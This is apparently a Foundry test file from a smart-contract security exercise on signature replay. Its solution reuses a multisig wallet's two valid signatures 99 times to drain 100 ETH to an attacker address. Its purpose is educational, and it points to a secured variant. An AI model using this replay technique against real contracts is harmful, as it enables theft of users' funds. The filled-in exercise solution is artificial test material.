// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "src/replay-attack-1/Signature.sol";
import "src/replay-attack-1/MultiSignatureWallet.sol";

/**
 * @dev run "forge test -vvv --match-contract RA1"
 */
contract TestRA1 is Test {
    uint256 constant ETH_IN_MULTISIG = 100 ether;
    uint256 constant ATTACKER_WITHDRAW = 1 ether;

    // Note: Replace with SecuredMultiSignatureWallet to try out more secure implementation
    MultiSignatureWallet multiSigWallet;
    uint256 attackerBalanceBeforeAttack;
    address deployer;
    uint256 deployerKey;
    address signer2;
    uint256 signer2Key;
    address attacker = makeAddr("attacker");

    function setUp() public {
        /**
         * SETUP EXERCISE - DON'T CHANGE ANYTHING HERE
         */
        (deployer, deployerKey) = makeAddrAndKey("deployer");
        (signer2, signer2Key) = makeAddrAndKey("signer2");

        vm.deal(deployer, 1000 ether);
        vm.startPrank(deployer);

        // Deploy multi sig
        multiSigWallet = new MultiSignatureWallet([deployer, signer2]);
        // Send ETH to multisig Wallet
        payable(address(multiSigWallet)).transfer(ETH_IN_MULTISIG);
        assertEq(address(multiSigWallet).balance, ETH_IN_MULTISIG);

        // Prepare withdraw message
        bytes32 message = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n52", attacker, ATTACKER_WITHDRAW));

        // Sign message, Simulate signing
        (uint8 v1, bytes32 r1, bytes32 s1) = vm.sign(deployerKey, message);
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(signer2Key, message);

        Signature memory signature1 = Signature(v1, r1, s1);
        Signature memory signature2 = Signature(v2, r2, s2);

        console.log("signature1: ");
        console.log("v: ", signature1.v);
        console.logBytes32(signature1.r);
        console.logBytes32(signature1.s);
        console.log("signature2: ");
        console.log("v: ", signature2.v);
        console.logBytes32(signature2.r);
        console.logBytes32(signature2.s);

        // Call transfer with signatures
        multiSigWallet.transfer(attacker, ATTACKER_WITHDRAW, [signature1, signature2]);

        assertEq(address(multiSigWallet).balance, ETH_IN_MULTISIG - ATTACKER_WITHDRAW);
    }

    function testWallet() public {
        /**
         * CODE YOUR SOLUTION HERE
         */
        vm.startPrank(attacker);
        uint8 v1 = 27;
        bytes32 r1 = 0x1ddabf42460a80d2780a214aeec06787c1feb8046f4a88662db254e1ea1c15db;
        bytes32 s1 = 0x1ddb0931fa6572af9ea5bab4c7afd0779a095beb68a9ca160c8b23647d63f7f9;

        uint8 v2 = 27;
        bytes32 r2 = 0xada7024b0ac3b997b1d05eedf4ba6020f1fdc92eaae47c2e9c6ec354ec86b075;
        bytes32 s2 = 0x541172db522d0cc2ef6c651c8ef67b9f8fb858b394e239d8d1507e58356f787c;

        Signature memory signature1 = Signature(v1, r1, s1);
        Signature memory signature2 = Signature(v2, r2, s2);

        for (uint256 index = 0; index < 99; index++) {
            multiSigWallet.transfer(attacker, ATTACKER_WITHDRAW, [signature1, signature2]);
        }
        /**
         * SUCCESS CONDITIONS
         */
        //MultiSig Wallet is empty
        assertEq(address(multiSigWallet).balance, 0);
        // Attacker is supposed to own the stolen ETH ( +99 ETH , -0.1 ETH for gas)
        assertGt(attacker.balance, 99 ether, "Mission fail, not enough ETH stolen");
    }
}
